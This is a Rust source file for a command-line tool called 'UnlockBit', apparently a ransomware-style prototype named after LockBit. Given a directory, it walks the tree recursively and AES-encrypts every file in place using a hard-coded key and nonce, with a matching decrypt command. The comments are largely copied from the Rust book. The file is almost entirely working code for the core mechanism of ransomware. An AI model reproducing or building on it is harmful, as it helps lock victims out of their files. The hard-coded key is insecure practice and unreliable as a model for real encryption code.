mod enc;

use std::{error::Error, fs, path::Path};

use crate::enc::{encrypt_aes, decrypt_aes};

// I/O functions and other things that might fail should return a Result<T, E> in their signatures.
// Please follow https://doc.rust-lang.org/book/ch12-03-improving-error-handling-and-modularity.html


// Config struct that will hold the values that are parsed from the command line arguments
pub struct Config {
    pub command: String,
    pub file_path: String,
}

// Config::build function that will handle creating an instance of Config. 
// We return a Result value that will contain a Config instance 
// in the successful case and will return &'static str in the error case.. 
// We’re also going to change the function name from new to build because 
// many programmers expect new functions to never fail
impl Config {
    pub fn build(args: &[String]) -> Result<Config, &'static str> {
        if args.len() < 3 {
            return Err("not enough arguments");
        }

        let command = args[1].clone();
        let file_path = args[2].clone();

        Ok(Config { command, file_path })
    }
}

// function named run that will hold all the logic currently in the main function 
// that isn’t involved with setting up configuration or handling errors.
pub fn run(config: Config) -> Result<(), Box<dyn Error>> {
    let path = Path::new(config.file_path.as_str());
    assert!(path.exists()); // If assertion is raised, program stops
    
    println!("Welcome to UnlockBit, we will make sure to encrypt your data and (hopefully) retrieve it");
    println!("You specified {} command", config.command);
    println!("Output\n");

    //known values : to change later
    let key = "9311d97f2dd4e73fea8e60d3e1130c4cdc611e47261e498e2de6647bc477d1f7";
    let nonce = "301a35dbfce88096d1fbf0b7";

    // Check if the path is a directory
    if path.is_dir() {
        // Recursively encrypt or decrypt all files in the directory
        recursive_process_directory(path, &config.command, key, nonce)?;
    } else {
        // Otherwise, process the single file
        process_file(path, &config.command, key, nonce)?;
    }

    Ok(())
}


fn recursive_process_directory(dir_path: &Path, command: &str, key: &str, nonce: &str) -> Result<(), Box<dyn Error>> {
    for entry in fs::read_dir(dir_path)? {
        let entry = entry?;
        let path = entry.path();

        // Recursive call for subdirectories
        if path.is_dir() {
            recursive_process_directory(&path, command, key, nonce)?;
        } else {
            // Process individual files
            process_file(&path, command, key, nonce)?;
        }
    }

    Ok(())
}



fn process_file(path: &Path, command: &str, key: &str, nonce: &str) -> Result<(), Box<dyn Error>> {

    let path_str = if let Some(p) = path.to_str() {
        p
    } else {
        println!("Unable to convert path to string.");
        return Ok(());
    };

    println!("Path as string: {}", path_str);

    match command {
        "encrypt" => {
            if let Err(err) = encrypt_aes(path_str) {
                eprintln!("Error: {}", err);
            } else {
                println!("File encrypted successfully!");
            }
        }
        "decrypt" => {
            if let Err(err) = decrypt_aes(path_str, key, nonce) {
                eprintln!("Error: {}", err);
            } else {
                println!("File decrypted successfully!");
            }
        }
        &_ => todo!()
    };

    Ok(())

}

